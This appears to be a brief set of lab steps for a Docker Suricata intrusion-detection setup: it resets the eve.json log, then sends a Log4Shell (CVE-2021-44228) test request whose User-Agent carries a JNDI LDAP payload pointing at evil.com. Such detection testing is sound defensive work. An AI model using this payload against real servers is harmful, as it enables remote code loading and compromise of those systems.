- executte  `sudo rmdir config/suricata/logs/eve.json` 
- executte  `sudo touch config/suricata/logs/eve.json`
...
- docker compose exec curl curl -v -H "User-Agent: \${jndi:ldap://evil.com/Coucou_C_est_Moi}" "http://server-app/" #Log4Shell (CVE-2021-44228) 
